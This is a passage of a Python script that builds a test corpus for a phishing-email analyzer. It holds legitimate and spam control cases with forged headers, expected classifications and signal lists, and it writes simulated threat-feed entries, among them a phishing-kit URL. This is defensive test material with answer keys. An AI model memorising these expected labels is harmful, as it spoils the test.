    id='L4-ti-interna-senha-expirando',
    titulo='LEGÍTIMO: aviso interno verdadeiro de senha expirando (sem link externo)',
    tecnica='Controle de falso positivo: fala de senha e prazo, mas é interno, autenticado e não pede a senha.',
    cabecalhos=[('Received', f'from {EXO} (2603:10d6:103:12c::9) by {EXO} with HTTPS; {data}'),
                ('Authentication-Results', f'dkim=none (message not signed) header.d=none;dmarc=none action=none header.from={ORG};'),
                ('From', nome_codificado('Central de Serviços de TI', f'servicedesk@{ORG}')),
                ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Sua senha da rede expira em 5 dias')),
                ('Date', data), ('Message-ID', f'<CP8PR80MB4932SENHA1200@{EXO}>'),
                ('X-MS-Exchange-Organization-AuthAs', 'Internal'), ('X-MS-Exchange-Organization-AuthSource', EXO)],
    corpo=corpo,
    relato='Recebi aviso de senha expirando. É da nossa TI mesmo? Não cliquei em nada.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=[],
    sinais_proibidos=['marca', 'link-disfarcado', 'dmarc', 'spf'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG, 'senha.cybersecurity.local']),
    reputacao=dict(),
)

# L5 ---------------------------------------------------------------- NF-e real de fornecedor conhecido (PDF + XML)
dom = 'graficapaulista.example'
ip = '198.51.100.200'
data = 'Fri, 20 Nov 2026 16:10:00 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
xml_nfe = ('<?xml version="1.0" encoding="UTF-8"?><nfeProc versao="4.00" xmlns="http://www.portalfiscal.inf.br/nfe">'
           '<NFe><infNFe Id="NFe35261100000000000191550010000045121000045123" versao="4.00"><ide><nNF>4512</nNF>'
           '<natOp>VENDA</natOp></ide><emit><xNome>GRAFICA PAULISTA LTDA (TESTE)</xNome></emit>'
           '<total><ICMSTot><vNF>38250.00</vNF></ICMSTot></total></infNFe></NFe></nfeProc>').encode('utf-8')
txt = ('Prezado cliente,\n\nSegue em anexo o DANFE e o XML da NF-e nº 4512 referente ao pedido 4471.\n\n'
       'Valor: R$ 38.250,00\nVencimento: 16/11/2026 (boleto já enviado pelo banco)\n\nGráfica Paulista Ltda\n'
       'Este é um e-mail automático do sistema de faturamento.\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_NFe_4512_1763655000')
corpo.attach(texto(txt))
corpo.attach(anexo(pdf_minimo(['DANFE - NF-e 4512', 'GRAFICA PAULISTA LTDA', 'Valor total: R$ 38.250,00',
                               'Documento de teste do corpus do analisador-phishing-glpi']),
                   'application/pdf', 'DANFE_NFe_4512.pdf'))
corpo.attach(anexo(xml_nfe, 'application/xml', '35261100000000000191550010000045121000045123-nfe.xml'))
caso(
    id='L5-nfe-fornecedor-conhecido',
    titulo='LEGÍTIMO: NF-e verdadeira do fornecedor conhecido (o mesmo que o caso 09 imita)',
    tecnica='Controle de falso positivo: fala de pagamento, boleto e vencimento, com PDF e XML; domínio antigo e autenticado.',
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Faturamento Gráfica Paulista', f'nfe@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('NF-e 4512 - Gráfica Paulista Ltda')),
               ('Date', data), ('Message-ID', f'<NFe4512.1763655000@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou a nota fiscal da Gráfica Paulista, o pedido é nosso mesmo. Só confirmando se o e-mail é seguro, porque ontem tentaram um golpe com o nome deles.',
    requerente='ana.ribeiro (Compras)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='Finance', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['anexo-perigoso', 'dupla-extensao', 'dmarc', 'spf'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 5120}),
)

# L6 ---------------------------------------------------------------- comunicado verdadeiro do banco (marketing)
ip = '192.0.2.43'  # IP de documentação: não sabemos o IP real do servidor do banco
data = 'Sat, 21 Nov 2026 13:00:00 +0000'
rec, rec_ext = received_exo('mta-out12.comunicacao.itau.com.br', ip, data)
htm = '''<html><body style="font-family:Arial;font-size:14px">
<div style="background:#ec7000;color:#fff;padding:14px"><b>Itaú</b></div>
<div style="padding:18px"><p>Olá, Maria,</p>
<p>O seu limite do cartão Itaú Uniclass foi revisado. Confira as condições no app Itaú.</p>
<p>Lembre-se: o Itaú nunca pede senha, token ou código por e-mail, SMS ou telefone.</p>
<p><a href="https://www.itau.com.br/cartoes">Conheça os cartões Itaú</a></p>
<p style="font-size:11px">Para não receber mais comunicações, <a href="https://comunicacao.itau.com.br/descadastro?c=8812">clique aqui</a>.</p>
</div></body></html>'''
txt = ('Olá, Maria,\n\nO seu limite do cartão Itaú Uniclass foi revisado. Confira as condições no app Itaú.\n\n'
       'Lembre-se: o Itaú nunca pede senha, token ou código por e-mail, SMS ou telefone.\n\nhttps://www.itau.com.br/cartoes\n')
corpo = alternativo(txt, htm, '----=_Part_itau_8812')
caso(
    id='L6-banco-comunicado-verdadeiro',
    titulo='LEGÍTIMO: comunicado verdadeiro do banco, de subdomínio oficial e com descadastro',
    tecnica='Controle de falso positivo: marca de banco, mas de domínio oficial, autenticado e sem pedido de dados.',
    cabecalhos=rec + [*autenticacao_exo(ip, 'comunicacao.itau.com.br', 'comunicacao.itau.com.br', 'pass', 'pass', 'pass'), rec_ext,
               dkim_assinatura('comunicacao.itau.com.br', 'itau1'),
               ('From', nome_codificado('Itaú Unibanco', 'informativo@comunicacao.itau.com.br')),
               ('To', f'maria.souza@{ORG}'), ('Subject', assunto('Maria, seu limite foi revisado')),
               ('List-Unsubscribe', '<https://comunicacao.itau.com.br/descadastro?c=8812>'),
               ('List-Unsubscribe-Post', 'List-Unsubscribe=One-Click'),
               ('Date', data), ('Message-ID', '<8812.20261121130000@comunicacao.itau.com.br>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou um e-mail do Itaú no meu e-mail do trabalho. É golpe? Não cliquei.',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['marca', 'marca-link', 'link-disfarcado', 'dmarc'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['itau.com.br', 'comunicacao.itau.com.br', 'www.itau.com.br']),
    reputacao=dict(),
)

# L7 ---------------------------------------------------------------- .zip verdadeiro do fornecedor (PDF + XML)
dom = 'graficapaulista.example'
ip = '198.51.100.200'
data = 'Mon, 23 Nov 2026 10:05:00 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
z = zip_fixo([('NFe_4513/DANFE_NFe_4513.pdf', pdf_minimo(['DANFE - NF-e 4513', 'Documento de teste do corpus'])),
              ('NFe_4513/35261100000000000191550010000045131000045130-nfe.xml', b'<?xml version="1.0"?><nfeProc versao="4.00"/>')])
txt = ('Prezado cliente,\n\nSegue em anexo (compactado) o DANFE e o XML da NF-e nº 4513 referente ao pedido 4480.\n\n'
       'Gráfica Paulista Ltda\nEste é um e-mail automático do sistema de faturamento.\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_NFe_4513_1763892300')
corpo.attach(texto(txt))
corpo.attach(anexo(z, 'application/zip', 'NFe_4513.zip'))
caso(
    id='L7-zip-notas-fornecedor',
    titulo='LEGÍTIMO: .zip verdadeiro do fornecedor conhecido com PDF e XML da nota',
    tecnica='Controle de falso positivo do detector de .zip: compactado, mas só com documentos (PDF/XML), de domínio antigo e autenticado.',
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Gráfica Paulista - Faturamento', f'nfe@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('NF-e 4513 - Gráfica Paulista')),
               ('Date', data), ('Message-ID', f'<nfe4513.1763892300@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='A gráfica mandou as notas num zip. Posso abrir?',
    requerente='ana.ribeiro (Financeiro)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='Finance', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado', 'anexo-compactado'],
    sinais_proibidos=['zip-conteudo-perigoso', 'zip-com-senha', 'html-smuggling', 'dupla-extensao'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 5120}),
)

# L8 ---------------------------------------------------------------- alerta verdadeiro de compra no cartão (assinatura + telefone)
ip = '192.0.2.44'  # IP de documentação: não sabemos o IP real do servidor do banco
data = 'Mon, 23 Nov 2026 21:14:00 +0000'
rec, rec_ext = received_exo('mta-out03.comunicacao.itau.com.br', ip, data)
htm = '''<html><body style="font-family:Arial;font-size:14px">
<div style="background:#ec7000;color:#fff;padding:14px"><b>Itaú</b></div>
<div style="padding:18px"><p>Olá, Lucas,</p>
<p>Compra aprovada no cartão final 4410: <b>Assinatura mensal STREAMFLIX</b>, R$ 55,90, em 23/11 às 21:13.</p>
<p>Se você não reconhece esta compra, bloqueie o cartão pelo app Itaú ou ligue para a Central de Atendimento: 4004-0000
(capitais) ou 0800 000 0000 (demais localidades).</p>
<p>O Itaú nunca pede senha, token ou código por e-mail, SMS ou telefone.</p></div></body></html>'''
txt = ('Olá, Lucas,\n\nCompra aprovada no cartão final 4410: Assinatura mensal STREAMFLIX, R$ 55,90, em 23/11 às 21:13.\n\n'
       'Se você não reconhece esta compra, bloqueie o cartão pelo app Itaú ou ligue para a Central de Atendimento: '
       '4004-0000 (capitais) ou 0800 000 0000 (demais localidades).\n\nO Itaú nunca pede senha, token ou código por '
       'e-mail, SMS ou telefone.\n')
corpo = alternativo(txt, htm, '----=_Part_itau_alerta_4410')
caso(
    id='L8-banco-alerta-compra-assinatura',
    titulo='LEGÍTIMO: alerta verdadeiro do banco de compra de assinatura, com telefone da central',
    tecnica=('Controle de falso positivo do detector de golpe por telefone: fala de assinatura mensal e manda ligar se não '
             'reconhecer, mas vem do domínio oficial do banco, autenticado, e o banco não repassa texto de terceiros.'),
    cabecalhos=rec + [*autenticacao_exo(ip, 'comunicacao.itau.com.br', 'comunicacao.itau.com.br', 'pass', 'pass', 'pass'), rec_ext,
               dkim_assinatura('comunicacao.itau.com.br', 'itau1'),
               ('From', nome_codificado('Itaú Cartões', 'alertas@comunicacao.itau.com.br')),
               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Compra aprovada no seu cartão final 4410')),
               ('Date', data), ('Message-ID', '<alerta4410.20261123211400@comunicacao.itau.com.br>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou alerta de compra do Itaú no e-mail do trabalho. Fui eu que assinei, mas quero saber se o e-mail é verdadeiro.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['callback-telefone', 'marca', 'marca-link'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['itau.com.br', 'comunicacao.itau.com.br']),
    reputacao=dict(),
)

# L9 ---------------------------------------------------------------- TI interna: login no app novo pela Microsoft (OAuth sem risco)
data = 'Tue, 24 Nov 2026 09:00:00 +0000'
alvo = ('https://login.microsoftonline.com/0f6a1d2c-3b4e-4f5a-8c9d-1e2f3a4b5c6d/oauth2/v2.0/authorize?client_id='
        '5c1d2e3f-4a5b-4c6d-8e7f-9a0b1c2d3e4f&response_type=code&redirect_uri=https%3A%2F%2Fponto.cybersecurity.local'
        '%2Fsignin-oidc&scope=openid%20profile%20User.Read&response_mode=form_post')
htm = f'''<html><body style="font-family:Calibri,Arial;font-size:11pt">
<p>Olá, equipe,</p>
<p>O novo sistema de ponto já está liberado. Entre com a sua conta corporativa (o mesmo login do Outlook):
<a href="{alvo}">Acessar o sistema de ponto</a>.</p>
<p>Dúvidas: Central de Serviços de TI - ramal 4000.</p></body></html>'''
txt = ('Olá, equipe,\n\nO novo sistema de ponto já está liberado. Entre com a sua conta corporativa (o mesmo login do '
       f'Outlook): {alvo}\n\nDúvidas: Central de Serviços de TI - ramal 4000.\n')
corpo = alternativo(txt, htm, '_000_CP8PR80MB4932PONTO_')
caso(
    id='L9-ti-interna-login-microsoft',
    titulo='LEGÍTIMO: TI interna pede login no sistema novo pela página da Microsoft (só perfil básico)',
    tecnica=('Controle de falso positivo do detector de consentimento OAuth: link oauth2/authorize verdadeiro, mas só pede '
             'openid/profile/User.Read e devolve para um endereço da própria organização.'),
    cabecalhos=[('Received', f'from {EXO} (2603:10d6:103:12c::9) by {EXO} with HTTPS; {data}'),
                ('Authentication-Results', f'dkim=none (message not signed) header.d=none;dmarc=none action=none header.from={ORG};'),
                ('From', nome_codificado('Central de Serviços de TI', f'servicedesk@{ORG}')),
                ('To', f'todos@{ORG}'), ('Subject', assunto('Novo sistema de ponto liberado')),
                ('Date', data), ('Message-ID', f'<CP8PR80MB4932PONTO0900@{EXO}>'),
                ('X-MS-Exchange-Organization-AuthAs', 'Internal'), ('X-MS-Exchange-Organization-AuthSource', EXO)],
    corpo=corpo,
    relato='A TI mandou link para o sistema de ponto que abre a tela da Microsoft. É seguro entrar?',
    requerente='maria.souza (Financeiro)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=[],
    sinais_proibidos=['oauth-consentimento', 'device-code', 'compartilhamento-falso', 'marca'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['login.microsoftonline.com', 'microsoftonline.com', ORG]),
    reputacao=dict(),
)

# L10 --------------------------------------------------------------- RH interno lembra a regra da conta salário
data = 'Tue, 24 Nov 2026 11:30:00 +0000'
txt = ('Prezados colaboradores,\n\nLembrete: a troca da conta salário só pode ser feita pelo Portal do Colaborador, '
       'com a sua senha da rede, até o dia 20 de cada mês. O RH nunca aceita pedido de troca de conta pelo e-mail pessoal '
       'nem por telefone: se receber algo assim em nome de um colega, avise a Segurança da Informação.\n\n'
       'Recursos Humanos\nCybersecurity Ltda\n')
corpo = texto(txt)
caso(
    id='L10-rh-interno-regra-conta-salario',
    titulo='LEGÍTIMO: comunicado interno do RH sobre a regra de troca de conta salário',
    tecnica=('Controle de falso positivo dos detectores de fraude de conta salário e de desculpa (e-mail pessoal): '
             'o texto fala dos dois, mas vem da própria organização.'),
    cabecalhos=[('Received', f'from {EXO} (2603:10d6:103:12c::9) by {EXO} with HTTPS; {data}'),
                ('Authentication-Results', f'dkim=none (message not signed) header.d=none;dmarc=none action=none header.from={ORG};'),
                ('From', nome_codificado('Recursos Humanos', f'rh@{ORG}')),
                ('To', f'todos@{ORG}'), ('Subject', assunto('Lembrete: troca de conta salário')),
                ('Date', data), ('Message-ID', f'<CP8PR80MB4932RH1130@{EXO}>'),
                ('X-MS-Exchange-Organization-AuthAs', 'Internal'), ('X-MS-Exchange-Organization-AuthSource', EXO)],
    corpo=corpo,
    relato='Recebi esse lembrete do RH sobre conta salário. É do RH mesmo?',
    requerente='joao.lima (RH)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='HR', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=[],
    sinais_proibidos=['bec-conta-salario', 'bec-pretexto', 'bec', 'imita-organizacao'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(),
)

# L11 --------------------------------------------------------------- boleto verdadeiro com QR Code PIX no PDF
dom = 'graficapaulista.example'
ip = '198.51.100.200'
data = 'Wed, 25 Nov 2026 08:30:00 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
pix = pix_copia_e_cola('00000000000191', 'GRAFICA PAULISTA LTDA', 'SAO PAULO', '12450.00', 'PED4480')
txt = ('Prezado cliente,\n\nSegue o boleto do pedido 4480 (vencimento 05/12/2026, R$ 12.450,00). O pagamento também pode '
       'ser feito por PIX pelo QR Code impresso no boleto.\n\nGráfica Paulista Ltda\nEste é um e-mail automático do sistema de faturamento.\n')
corpo = MIMEMultipart('mixed')
corpo.set_boundary('----=_Part_Boleto_4480_1763980200')
corpo.attach(texto(txt))
corpo.attach(anexo(pdf_com_qr(['Boleto - Pedido 4480 - GRAFICA PAULISTA LTDA', 'Vencimento 05/12/2026 - R$ 12.450,00',
                               'Pague com PIX pelo QR Code', 'Documento de teste do corpus do analisador-phishing-glpi'], pix),
                   'application/pdf', 'Boleto_Pedido_4480.pdf'))
caso(
    id='L11-boleto-pix-fornecedor',
    titulo='LEGÍTIMO: boleto verdadeiro do fornecedor com QR Code PIX no PDF',
    tecnica=('Controle de falso positivo do leitor de QR: QR Code em PDF é normal em boleto. O QR traz um código PIX '
             '(não um link), o recebedor é o próprio fornecedor e o e-mail é autenticado de domínio antigo.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Gráfica Paulista - Faturamento', f'nfe@{dom}')),
               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('Boleto do pedido 4480 - Gráfica Paulista')),
               ('Date', data), ('Message-ID', f'<boleto4480.1763980200@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou o boleto da gráfica com QR Code de PIX. Pode pagar?',
    requerente='ana.ribeiro (Financeiro)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='Finance', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['qrcode-decodificado', 'qrcode-desenhado', 'pdf-com-senha'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 5120}),
    qr={'Boleto_Pedido_4480.pdf': [pix]},
)

# L12 --------------------------------------------------------------- Google Sites legítimo; outra página do Google Sites no feed
dom = 'associacaocomercial.example'
ip = '198.51.100.31'
data = 'Fri, 20 Nov 2026 14:00:00 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
alvo = 'https://sites.google.com/view/semana-seguranca-2026'
FEED_OPENPHISH.append('https://sites.google.com/view/login-cybersecurity-local')
htm = f'''<html><body style="font-family:Arial;font-size:14px">
<p>Prezados associados,</p><p>A programação da Semana de Segurança 2026 está no site do evento:
<a href="{alvo}">Semana de Segurança 2026</a>.</p><p>Associação Comercial</p></body></html>'''
txt = f'Prezados associados,\n\nA programação da Semana de Segurança 2026 está no site do evento: {alvo}\n\nAssociação Comercial\n'
corpo = alternativo(txt, htm, '----=_Part_semana_2026')
caso(
    id='L12-google-sites-evento-legitimo',
    titulo='LEGÍTIMO: site de evento no Google Sites, enquanto OUTRA página do Google Sites está no OpenPhish',
    tecnica=('Controle de falso positivo dos feeds: o host sites.google.com é compartilhado. O feed só pode marcar a URL '
             'exata do golpe, nunca o host inteiro (senão todo link do Google Sites viraria phishing).'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Associação Comercial', f'eventos@{dom}')),
               ('To', f'todos@{ORG}'), ('Subject', assunto('Programação da Semana de Segurança 2026')),
               ('Date', data), ('Message-ID', f'<semana2026.1763647200@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='A associação mandou link do Google Sites. É seguro?',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['feed-host', 'feed-url'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['sites.google.com', 'google.com', ORG]),
    reputacao=dict(rdap={dom: 5000}),
)

# L13 --------------------------------------------------------------- newsletter de site INVADIDO (o dono é legítimo)
dom = 'padariasaopedro.example'
ip = '192.0.2.77'
data = 'Fri, 20 Nov 2026 18:00:00 +0000'
rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
threatfox(f'https://www.{dom}/wp-content/plugins/galeria-x/m365/login.php', 'url', 'payload_delivery', 'phishing kit')
htm = f'''<html><body style="font-family:Georgia,serif;font-size:15px">
<p>Olá!</p><p>O cardápio de Natal da Padaria São Pedro já está no ar: <a href="https://www.{dom}/natal">veja as encomendas</a>.</p>
<p style="font-size:11px"><a href="https://www.{dom}/descadastrar?e=553">Descadastrar</a></p></body></html>'''
txt = f'Olá!\n\nO cardápio de Natal da Padaria São Pedro já está no ar: https://www.{dom}/natal\n\nDescadastrar: https://www.{dom}/descadastrar?e=553\n'
corpo = alternativo(txt, htm, '----=_Part_natal_553')
caso(
    id='L13-newsletter-de-site-invadido',
    titulo='LEGÍTIMO: newsletter da padaria cujo site foi invadido (página de phishing em /wp-content/ no ThreatFox)',
    tecnica=('Controle de falso positivo dos feeds: o ThreatFox tem uma página maliciosa pendurada no WordPress invadido da '
             'padaria. O host vira "site invadido" (peso menor, avisa o analista), não evidência forte: o e-mail da própria '
             'padaria, autenticado e com link para o cardápio, continua legítimo.'),
    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
               ('From', nome_codificado('Padaria São Pedro', f'contato@{dom}')),
               ('To', f'joao.lima@{ORG}'), ('Subject', assunto('Encomendas de Natal abertas')),
               ('List-Unsubscribe', f'<https://www.{dom}/descadastrar?e=553>'),
               ('Date', data), ('Message-ID', f'<natal553.1763661600@{dom}>'), *antispam_exo()],
    corpo=corpo,
    relato='Recebo sempre e-mail da padaria aqui do lado, mas o antivírus da minha casa disse que o site deles é perigoso. É golpe?',
    requerente='joao.lima (RH)',
    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado', 'feed-site-invadido'],
    sinais_proibidos=['feed-host', 'feed-url'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 4200}),
)

# ================================================================ SPAM (não malicioso)

# S1 ---------------------------------------------------------------- newsletter de loja desconhecida
dom = 'megaofertas-online.example'
ip = '198.51.100.77'
data = 'Mon, 23 Nov 2026 07:00:00 +0000'
rec, rec_ext = received_exo(f'mta-7.mail.{dom}', ip, data)
htm = f'''<html><body style="font-family:Arial;background:#111;color:#fff;text-align:center">
<h1 style="color:#ffd400">BLACK NOVEMBER</h1><p style="font-size:20px">Até 70% OFF em eletrônicos</p>
<p><a href="https://www.{dom}/black-november?utm_source=newsletter&utm_campaign=bn26" style="color:#ffd400">VER OFERTAS</a></p>
<p style="font-size:11px;color:#999">Você recebeu este e-mail porque se cadastrou em nosso site.
<a href="https://www.{dom}/descadastrar?e=8a7f" style="color:#999">Descadastrar</a></p></body></html>'''
txt = (f'BLACK NOVEMBER - Até 70% OFF em eletrônicos\n\nVER OFERTAS: https://www.{dom}/black-november?utm_source=newsletter\n\n'
       f'Descadastrar: https://www.{dom}/descadastrar?e=8a7f\n')
corpo = alternativo(txt, htm, '----=_Part_bn26_mkt')
caso(
    id='S1-newsletter-loja',
    titulo='SPAM: newsletter de loja (Black November), autenticada e com descadastro',
    tecnica='Marketing não solicitado: incômodo, mas sem golpe (sem pedido de dados, link para a própria loja).',
    cabecalhos=rec + [*autenticacao_exo(ip, f'mail.{dom}', dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom, 'mkt'),
               ('From', nome_codificado('MegaOfertas', f'ofertas@{dom}')),
               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('🔥 BLACK NOVEMBER: até 70% OFF só hoje')),
               ('List-Unsubscribe', f'<https://www.{dom}/descadastrar?e=8a7f>, <mailto:unsub@{dom}>'),
               ('List-Unsubscribe-Post', 'List-Unsubscribe=One-Click'), ('Precedence', 'bulk'),
               ('Date', data), ('Message-ID', f'<bn26.8a7f@mail.{dom}>'), *antispam_exo(scl=5)],
    corpo=corpo,
    relato='Não me cadastrei nessa loja e está chegando todo dia. É perigoso?',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='spam', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['marca', 'link-disfarcado', 'dmarc'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
    reputacao=dict(rdap={dom: 1460}),
)

# S2 ---------------------------------------------------------------- prospecção fria (SEO)
ip = '209.85.220.73'
data = 'Mon, 23 Nov 2026 12:37:19 +0000'
rec, rec_ext = received_exo('mail-sor-f73.google.com', ip, data)
txt = ('Olá, equipe Cybersecurity!\n\nAnalisei o site de vocês e encontrei 27 erros de SEO que estão fazendo vocês perderem '
       'posições no Google. Trabalho com otimização há 8 anos e posso enviar um relatório gratuito com as correções.\n\n'
       'Posso mandar o orçamento? Se não tiver interesse, é só responder "não" que eu não envio mais.\n\n'
       'Abraço,\nThiago Rocha\nConsultor de SEO\n')
corpo = texto(txt)
caso(
    id='S2-prospeccao-seo',
    titulo='SPAM: prospecção fria de serviço de SEO pelo Gmail',
    tecnica='Prospecção comercial não solicitada: sem link, sem pedido de dados, sem urgência.',
    cabecalhos=rec + [*autenticacao_exo(ip, 'gmail.com', 'gmail.com', 'pass', 'pass', 'pass', dkim_d='gmail.com'), rec_ext,
               dkim_assinatura('gmail.com', '20230601'),
               ('From', nome_codificado('Thiago Rocha', 'thiago.rocha.seo@gmail.com')),
               ('To', f'contato@{ORG}'), ('Subject', '27 erros de SEO no site de voces'),
               ('Date', data), ('Message-ID', '<CAKd9nP2wQ7xR4mT1vY8_sL3bF6hN0jC5aE2gUo9iZ@mail.gmail.com>'), *antispam_exo()],
    corpo=corpo,
    relato='Chegou na caixa de contato. Não sei se é golpe.',
    requerente='lucas.ferreira (Comercial)',
    esperado=dict(classificacao='spam', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
    sinais_obrigatorios=['autenticado'],
    sinais_proibidos=['marca', 'bec', 'webmail'],
    bloqueio=dict(deve_ter=[], nao_pode_ter=['gmail.com', ORG]),
    reputacao=dict(),
)


# ---------------------------------------------------------------- grava
def gravar():
    os.makedirs(PASTA_EML, exist_ok=True)
    casos_json = []
    for c in CASOS:
        nome = f'{c["id"]}.eml'
        with open(os.path.join(PASTA_EML, nome), 'wb') as f:
            f.write(montar(c['cabecalhos'], c['corpo']))
        casos_json.append({
            'id': c['id'], 'arquivo': f'eml/{nome}', 'titulo': c['titulo'], 'tecnica': c['tecnica'],
            'relato': c['relato'], 'requerente': c['requerente'], 'esperado': c['esperado'],
            'sinais_obrigatorios': c.get('sinais_obrigatorios', []), 'sinais_proibidos': c.get('sinais_proibidos', []),
            'sinais_futuros': c.get('sinais_futuros', []),
            'bloqueio': c['bloqueio'], 'reputacao': c.get('reputacao', {}),
            'ioc_escondido': c.get('ioc_escondido', ''), 'qr': c.get('qr', {}), 'lacuna': c.get('lacuna', ''), 'nota': c.get('nota', ''),
        })
    # Feeds simulados no formato de cada fonte: texto (OpenPhish) e resposta do get_iocs (ThreatFox).
    with open(os.path.join(AQUI, 'feeds.json'), 'w', encoding='utf-8', newline='\n') as f:
        json.dump({'_aviso': 'Gerado por tests/corpus/gerar-corpus.py: edite lá e gere de novo.',
                   'openphish': '\n'.join(FEED_OPENPHISH) + '\n',
                   'threatfox': {'query_status': 'ok', 'data': FEED_THREATFOX}}, f, ensure_ascii=False, indent=1)
        f.write('\n')
    with open(os.path.join(AQUI, 'casos.json'), 'w', encoding='utf-8', newline='\n') as f:
        json.dump({'_aviso': 'Gerado por tests/corpus/gerar-corpus.py: edite lá e gere de novo.', 'casos': casos_json},
                  f, ensure_ascii=False, indent=1)
        f.write('\n')
    print(f'{len(casos_json)} casos gravados em {PASTA_EML}')


gravar()
